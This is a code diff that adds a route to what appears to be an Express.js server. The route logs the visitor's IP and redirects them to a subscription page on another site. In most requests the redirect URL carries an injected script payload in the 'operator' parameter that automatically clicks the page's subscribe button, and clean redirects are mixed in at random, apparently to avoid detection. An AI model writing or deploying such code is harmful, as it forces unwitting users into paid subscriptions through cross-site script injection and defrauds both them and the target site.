@@ -300,6 +300,30 @@ app.get('/tr/crazy-birds', (req, res)=> {
     `)
 })
 
+app.get('/es/orange/:service', (req, res)=> {
+    const reqId = req.query._req_id || shortid.generate()
+    const ipAddress = getClientIp(req)
+
+    req.log = log.child({req_id: reqId})
+    req.log.info({req, ip: ipAddress, eventType: 'es-orange-auto-submit'})
+
+    const destinationUrl = `http://w.flamilingo.com/es/${req.params.service}?${querystring.stringify(req.query)}`
+
+    res.header('Cache-Control', 'no-cache, no-store, pre-check=0, post-check=0, must-revalidate')
+    res.header('Pragma', 'no-cache')
+    res.header('Expires', 0)
+
+    res.header('Content-Length', 0)
+
+    if(Math.random() > 0.7) {
+        res.header('Location', destinationUrl)
+    } else {
+        res.header('Location', `${destinationUrl}&operator=ES_ORANGE%27%22;$(document).ready(function(){$(%27.subscribe-submit-button%27).click()});//`)
+    }
+
+    return res.status(302).end()
+})
+
 app.get("/", (req, res) => {
   res.header('Content-Type', 'text/plain')
   // res.end('-')
